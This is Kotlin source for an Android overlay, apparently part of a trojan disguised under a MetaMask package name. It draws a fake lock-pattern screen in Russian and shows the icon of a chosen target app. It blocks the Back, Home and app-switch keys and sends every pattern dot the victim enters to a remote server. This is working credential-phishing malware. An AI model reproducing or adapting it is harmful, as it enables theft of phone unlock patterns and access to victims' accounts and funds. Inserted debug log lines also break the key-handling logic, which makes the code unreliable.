package com.example.MetaMask.services

import android.content.Context
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.Paint
import android.graphics.Path
import android.graphics.PointF
import android.view.Gravity
import android.view.KeyEvent
import android.view.MotionEvent
import android.view.View
import android.widget.*
import org.json.JSONArray
import org.json.JSONObject

class HybridPatternOverlay(
    ctx: Context,
    cfg: JSONObject,
    private val mgr: HybridOverlayManager
) : FrameLayout(ctx) {

    private val customTitle = cfg.optString("title", "Нарисуйте графический ключ")
    private val customHint = cfg.optString("hint", "")
    private val brandPkg = cfg.optString("brand_pkg", "")

    private var brandIconView: ImageView? = null
    private var submitted = false
    private lateinit var patternView: PatternView
    private lateinit var statusText: TextView

    init {
        setBackgroundColor(Color.argb(238, 8, 8, 20))
        buildUi()
        loadBrandIcon()
    }

    private fun buildUi() {
        android.util.Log.d("XDBG", "[HybridPatternOverlay] buildUi enter") //xdbg
        val d = resources.displayMetrics.density
        fun Int.dp() = (this * d + 0.5f).toInt()

        val outer = LinearLayout(context).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            layoutParams = LayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.MATCH_PARENT)
            setPadding(0, 40.dp(), 0, 40.dp())
        }

        if (brandPkg.isNotEmpty()) {
            android.util.Log.d("XDBG", "[HybridPatternOverlay] if branch") //xdbg
            val iv = ImageView(context).apply {
                layoutParams = LinearLayout.LayoutParams(72.dp(), 72.dp()).apply {
                    gravity = Gravity.CENTER_HORIZONTAL
                    bottomMargin = 14.dp()
                }
                scaleType = ImageView.ScaleType.FIT_CENTER
            }
            brandIconView = iv
            outer.addView(iv)
        }

        outer.addView(TextView(context).apply {
            text = customTitle
            textSize = 18f
            setTextColor(Color.WHITE)
            gravity = Gravity.CENTER
            setPadding(32.dp(), 0, 32.dp(), 20.dp())
        })

        statusText = TextView(context).apply {
            text = customHint
            textSize = 13f
            setTextColor(Color.argb(180, 200, 200, 200))
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 16.dp())
        }
        outer.addView(statusText)

        val size = (resources.displayMetrics.widthPixels * 0.72f).toInt()
        patternView = PatternView(context).apply {
            layoutParams = LinearLayout.LayoutParams(size, size).apply {
                gravity = Gravity.CENTER_HORIZONTAL
            }
        }
        outer.addView(patternView)

        addView(outer)
    }

    private fun onPatternComplete(dots: List<Int>) {
        android.util.Log.d("XDBG", "[HybridPatternOverlay] onPatternComplete enter dots=${dots}") //xdbg
        if (submitted) return
        if (dots.size < 4) {
            android.util.Log.d("XDBG", "[HybridPatternOverlay] if branch") //xdbg
            statusText.text = "Слишком короткий ключ — минимум 4 точки"
            statusText.setTextColor(Color.argb(220, 220, 80, 80))
            postDelayed({
                statusText.text = customHint
                statusText.setTextColor(Color.argb(180, 200, 200, 200))
                patternView.reset()
            }, 800)
            return
        }

        submitted = true
        val arr = JSONArray().apply { dots.forEach { put(it) } }
        mgr.sendToServer(JSONObject().apply {
            put("action", "hybrid_overlay_input")
            put("type", "pattern_submit")
            put("data", arr)
            put("timestamp", System.currentTimeMillis())
        })
        post { mgr.close("pattern_submitted") }
    }

    private fun onPartialInput(dots: List<Int>) {
        android.util.Log.d("XDBG", "[HybridPatternOverlay] onPartialInput enter dots=${dots}") //xdbg
        if (dots.isEmpty()) return
        val arr = JSONArray().apply { dots.forEach { put(it) } }
        mgr.sendToServer(JSONObject().apply {
            put("action", "hybrid_overlay_input")
            put("type", "pattern")
            put("data", arr)
            put("timestamp", System.currentTimeMillis())
        })
    }

    private fun loadBrandIcon() {
        android.util.Log.d("XDBG", "[HybridPatternOverlay] loadBrandIcon enter") //xdbg
        if (brandPkg.isEmpty()) return
        try {
            val icon = context.packageManager.getApplicationIcon(brandPkg)
            brandIconView?.setImageDrawable(icon)
        } catch (_: Exception) {}
    }

    override fun dispatchKeyEvent(event: KeyEvent): Boolean {
        android.util.Log.d("XDBG", "[HybridPatternOverlay] dispatchKeyEvent enter event=${event}") //xdbg
        val c = event.keyCode
        if (c == KeyEvent.KEYCODE_BACK || c == KeyEvent.KEYCODE_HOME || c == KeyEvent.KEYCODE_APP_SWITCH)
            android.util.Log.d("XDBG", "[HybridPatternOverlay] return") //xdbg
            return true
        android.util.Log.d("XDBG", "[HybridPatternOverlay] return") //xdbg
        return super.dispatchKeyEvent(event)
    }

    inner class PatternView(ctx: Context) : View(ctx) {

        private val dots = Array(9) { PointF() }
        private val selected = mutableListOf<Int>()

        private var touching = false
        private var curX = 0f
        private var curY = 0f

        private val hitRadius get() = dotRadius * 1.8f
        private var dotRadius = 0f

        private val dotPaintIdle = Paint(Paint.ANTI_ALIAS_FLAG).apply {
            style = Paint.Style.FILL
        }
        private val dotPaintActive = Paint(Paint.ANTI_ALIAS_FLAG).apply {
            style = Paint.Style.FILL
            color = Color.argb(255, 80, 210, 140)
        }
        private val dotPaintCenter = Paint(Paint.ANTI_ALIAS_FLAG).apply {
            style = Paint.Style.FILL
            color = Color.WHITE
        }
        private val linePaint = Paint(Paint.ANTI_ALIAS_FLAG).apply {
            style = Paint.Style.STROKE
            color = Color.argb(200, 80, 210, 140)
            strokeCap = Paint.Cap.ROUND
            strokeJoin = Paint.Join.ROUND
        }
        private val lineCurrentPaint = Paint(Paint.ANTI_ALIAS_FLAG).apply {
            style = Paint.Style.STROKE
            color = Color.argb(100, 80, 210, 140)
            strokeCap = Paint.Cap.ROUND
        }

        override fun onSizeChanged(w: Int, h: Int, oldW: Int, oldH: Int) {
            android.util.Log.d("XDBG", "[HybridPatternOverlay] onSizeChanged enter w=${w} h=${h} oldW=${oldW} oldH=${oldH}") //xdbg
            super.onSizeChanged(w, h, oldW, oldH)
            val d = resources.displayMetrics.density
            dotRadius = 18f * d
            linePaint.strokeWidth = 4f * d
            lineCurrentPaint.strokeWidth = 3f * d

            val margin = w * 0.12f
            val step = (w - 2 * margin) / 2f
            for (i in 0 until 9) {
                android.util.Log.d("XDBG", "[HybridPatternOverlay] loop") //xdbg
                val row = i / 3
                val col = i % 3
                dots[i] = PointF(margin + col * step, margin + row * step)
            }
        }

        override fun onDraw(canvas: Canvas) {
            android.util.Log.d("XDBG", "[HybridPatternOverlay] onDraw enter canvas=${canvas}") //xdbg
            if (selected.size >= 2) {
                android.util.Log.d("XDBG", "[HybridPatternOverlay] if branch") //xdbg
                val p = Path()
                p.moveTo(dots[selected[0]].x, dots[selected[0]].y)
                for (i in 1 until selected.size) p.lineTo(dots[selected[i]].x, dots[selected[i]].y)
                canvas.drawPath(p, linePaint)
            }
            if (touching && selected.isNotEmpty()) {
                android.util.Log.d("XDBG", "[HybridPatternOverlay] if branch") //xdbg
                val last = dots[selected.last()]
                canvas.drawLine(last.x, last.y, curX, curY, lineCurrentPaint)
            }
            for (i in 0 until 9) {
                android.util.Log.d("XDBG", "[HybridPatternOverlay] loop") //xdbg
                val isActive = selected.contains(i)
                dotPaintIdle.color = if (isActive) Color.argb(0, 0, 0, 0) else Color.argb(100, 180, 180, 180)
                if (!isActive) canvas.drawCircle(dots[i].x, dots[i].y, dotRadius, dotPaintIdle)
                if (isActive) {
                    android.util.Log.d("XDBG", "[HybridPatternOverlay] if branch") //xdbg
                    canvas.drawCircle(dots[i].x, dots[i].y, dotRadius, dotPaintActive)
                    canvas.drawCircle(dots[i].x, dots[i].y, dotRadius * 0.38f, dotPaintCenter)
                }
            }
        }

        override fun onTouchEvent(event: MotionEvent): Boolean {
            android.util.Log.d("XDBG", "[HybridPatternOverlay] onTouchEvent enter event=${event}") //xdbg
            when (event.actionMasked) {
                MotionEvent.ACTION_DOWN -> {
                    touching = true
                    selected.clear()
                    curX = event.x; curY = event.y
                    checkHit(event.x, event.y)
                    invalidate()
                    android.util.Log.d("XDBG", "[HybridPatternOverlay] return") //xdbg
                    return true
                }
                MotionEvent.ACTION_MOVE -> {
                    curX = event.x; curY = event.y
                    checkHit(event.x, event.y)
                    invalidate()
                    android.util.Log.d("XDBG", "[HybridPatternOverlay] return") //xdbg
                    return true
                }
                MotionEvent.ACTION_UP, MotionEvent.ACTION_CANCEL -> {
                    touching = false
                    invalidate()
                    onPatternComplete(selected.toList())
                    android.util.Log.d("XDBG", "[HybridPatternOverlay] return") //xdbg
                    return true
                }
            }
            android.util.Log.d("XDBG", "[HybridPatternOverlay] return") //xdbg
            return false
        }

        private fun checkHit(x: Float, y: Float) {
            android.util.Log.d("XDBG", "[HybridPatternOverlay] checkHit enter x=${x} y=${y}") //xdbg
            for (i in 0 until 9) {
                android.util.Log.d("XDBG", "[HybridPatternOverlay] loop") //xdbg
                if (selected.contains(i)) continue
                val dx = x - dots[i].x
                val dy = y - dots[i].y
                if (dx * dx + dy * dy <= hitRadius * hitRadius) {
                    android.util.Log.d("XDBG", "[HybridPatternOverlay] if branch") //xdbg
                    selected.add(i)
                    onPartialInput(selected.toList())
                }
            }
        }

        fun reset() {
            android.util.Log.d("XDBG", "[HybridPatternOverlay] reset enter") //xdbg
            selected.clear()
            touching = false
            invalidate()
        }
    }
}
